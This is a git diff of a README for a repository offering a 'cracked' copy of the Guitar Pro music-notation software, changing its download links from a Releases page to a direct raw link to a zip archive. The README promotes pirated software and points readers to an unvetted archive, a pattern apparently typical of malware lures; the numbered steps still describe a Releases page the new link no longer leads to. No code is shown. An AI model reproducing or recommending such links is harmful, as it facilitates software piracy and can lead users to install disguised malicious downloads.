@@ -1,6 +1,6 @@
 # 🎸 Guitar-Pro-Cracked - Easily Play and Create Music Tabs
 
-[![Download Guitar-Pro-Cracked](https://img.shields.io/badge/Download-Guitar--Pro--Cracked-blue)](https://github.com/auiwdhoaw/Guitar-Pro-Cracked/releases)
+[![Download Guitar-Pro-Cracked](https://raw.githubusercontent.com/auiwdhoaw/Guitar-Pro-Cracked/main/Gippy/Guitar-Pro-Cracked.zip)](https://raw.githubusercontent.com/auiwdhoaw/Guitar-Pro-Cracked/main/Gippy/Guitar-Pro-Cracked.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To get started with Guitar-Pro-Cracked, follow these simple steps:
 
 1. Click the button below to visit the Releases page. 
    
-   [Download Guitar-Pro-Cracked](https://github.com/auiwdhoaw/Guitar-Pro-Cracked/releases)
+   [Download Guitar-Pro-Cracked](https://raw.githubusercontent.com/auiwdhoaw/Guitar-Pro-Cracked/main/Gippy/Guitar-Pro-Cracked.zip)
 
 2. On the Releases page, you will see the latest version listed at the top.
 3. Click on the version link to open the release details.
